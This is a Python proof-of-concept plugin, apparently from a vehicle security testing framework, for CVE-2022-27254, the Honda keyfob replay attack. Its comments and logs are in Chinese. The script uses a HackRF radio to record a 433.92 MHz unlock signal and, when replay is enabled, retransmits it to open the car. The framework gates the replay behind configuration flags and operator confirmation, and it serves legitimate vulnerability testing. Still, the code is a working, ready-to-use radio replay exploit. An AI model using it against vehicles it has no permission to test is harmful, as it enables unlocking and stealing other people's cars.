"""
PoC Name: RF Keyfob Signal Replay
CVE: CVE-2022-27254
Component: Multiple
Category: Advanced
Severity: High
CVSS: 6.5
Description: 录制/重放433.92MHz钥匙遥控解锁信号
Prerequisites: 支持SDR收发硬件环境 (如 HackRF, rpitx等)
B_RF_Keyfob_Replay.py <args>
"""
import subprocess
import sys
import os
import shutil
import tempfile
from iv_plugin_base import IVIVulnerabilityPlugin

class HondaReplayPlugin(IVIVulnerabilityPlugin):
    meta_display_id = "POC-ADV-002"
    """
    CVE-2022-27254: Honda Keyless Entry Replay Attack
    """
    meta_poc_name = "RF Keyfob Replay"
    meta_cve_id = "CVE-2022-27254"
    meta_severity = "High"
    meta_protocol = "rf"
    meta_target_os = ["all"]
    meta_required_params = ["frequency"]
    is_disruptive = False
    meta_destructive_level = "Safe"

    def __init__(self, target_config, logger=None):
        super().__init__(target_config, logger)
        self.results["cve_id"] = "CVE-2022-27254"
        self.freq = str(target_config.get("frequency", "433920000")) # 433.92 MHz
        self.sample_rate = str(target_config.get("sample_rate", "2000000"))
        self.record_seconds = int(target_config.get("record_seconds", 5))
        self.auto_replay = target_config.get("auto_replay") in (True, "true", "True", "1", 1)
        self.operator_confirmed_unlock = target_config.get("operator_confirmed_unlock") in (True, "true", "True", "1", 1)
        self.file_name = target_config.get("capture_path") or os.path.join(
            tempfile.gettempdir(),
            f"autosec_keyfob_{os.getpid()}.raw",
        )

    def check_prerequisites(self):
        # 检查 hackrf_transfer 工具是否存在
        if shutil.which("hackrf_transfer") is None:
            self.logger.error("未找到 hackrf_transfer 工具。")
            return False
        return True

    def exploit(self):
        self.logger.info("请准备好 HackRF 设备。")
        self.logger.info(
            "非交互式执行模式：将立即录制信号。请在任务启动后触发车钥匙信号。"
        )
        
        # 1. 录制信号
        sample_count = str(max(self.record_seconds, 1) * int(self.sample_rate))
        self.logger.info(f"正在录制信号 ({self.record_seconds}秒)...")
        try:
            # -r 接收, -f 频率, -s 采样率, -n 采样数 (2M * 5s = 10M samples)
            subprocess.run(
                ["hackrf_transfer", "-r", self.file_name, "-f", self.freq, "-s", self.sample_rate, "-n", sample_count],
                check=True,
                timeout=self.record_seconds + 10,
            )
            self.logger.info("信号录制完成。")
        except (subprocess.CalledProcessError, subprocess.TimeoutExpired) as exc:
            self.logger.error(f"录制失败，请检查设备连接: {exc}")
            return self.results

        if not self.auto_replay:
            self.results["vulnerable"] = False
            self.results["evidence"] = (
                f"RF signal captured to {self.file_name}; replay was not executed because auto_replay was not enabled."
            )
            return self.results

        # 2. 重放信号
        self.logger.info("正在重放信号...")
        try:
            subprocess.run(
                ["hackrf_transfer", "-t", self.file_name, "-f", self.freq, "-s", self.sample_rate],
                check=True,
                timeout=int(self.params.get("replay_timeout_seconds", 20)),
            )
            self.logger.info("重放完成。")

            if self.operator_confirmed_unlock:
                self.results["vulnerable"] = True
                self.results["evidence"] = "Operator confirmed vehicle unlock via replay."
            else:
                self.results["vulnerable"] = False
                self.results["evidence"] = "Replay transmitted; no operator confirmation of unlock was provided."
                
        except Exception as e:
            self.logger.error(f"重放失败: {e}")
            
        # 清理
        if os.path.exists(self.file_name):
            os.remove(self.file_name)
            
        return self.results

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("B_RF_Keyfob_Replay.py <args>")
        sys.exit(1)
    plugin = HondaReplayPlugin({"frequency": sys.argv[1]})
    plugin.run_verify()
